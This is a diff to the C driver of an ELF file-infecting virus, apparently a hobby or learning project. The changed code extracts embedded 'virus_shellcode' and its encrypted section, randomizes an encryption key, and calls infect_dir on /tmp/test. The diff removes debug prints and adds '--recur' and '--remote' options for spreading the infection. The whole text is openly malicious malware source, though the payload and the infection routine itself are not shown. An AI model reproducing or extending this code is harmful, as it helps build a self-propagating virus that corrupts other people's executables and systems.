@@ -19,9 +19,7 @@ int randomize(char *k){
 }
 
 int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
-	println("VIRUS INFO");
 	if (elf_check_valid(virus_shellcode, virus_shellcode_len) == FALSE) return FALSE;
-	//Elf64_Ehdr *h = (void*)virus_shellcode;
 	long long bin_start_off;
 	long long bin_end_off;
 
@@ -29,16 +27,11 @@ int get_virus_info(char **v, size_t *l, size_t *c_off, size_t *c_len){
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "bin_end", &bin_end_off);
 	(*v) = virus_shellcode + bin_start_off;
 	(*l) = bin_end_off - bin_start_off; 
-	printnbln(bin_start_off);
-	printnbln(bin_end_off);
 
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_start", c_off);
 	elf_off_symbol(virus_shellcode, virus_shellcode_len, "crypt_end", c_len);
 	(*c_len) = (*c_len)-(*c_off);
 	(*c_off) -= bin_start_off; 
-	printnbln(*c_off);
-	printnbln(*c_len);
-
 
 	return TRUE;
 }
@@ -51,10 +44,18 @@ int main(int ac, char **av){
 	size_t virus_len;
 	size_t crypt_off;
 	size_t crypt_len;
+	struct s_opt opt = {0,0};
 	if (get_virus_info(&virus, &virus_len, &crypt_off, &crypt_len) == FALSE)
 		return 1;
-	
 	randomize(KEY);
-	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len);
+
+	for (int i = 1; i < ac; i ++){
+		if (str_equal(av[i], "--recur"))
+			opt.is_recur = TRUE;
+		if (str_equal(av[i], "--remote"))
+			opt.is_remote = TRUE;
+	}
+	infect_dir("/tmp/test", virus, virus_len, crypt_off, crypt_len, opt);
+	//infect_dir("/tmp/test2", virus, virus_len, crypt_off, crypt_len, opt);
 	return 0;
 }
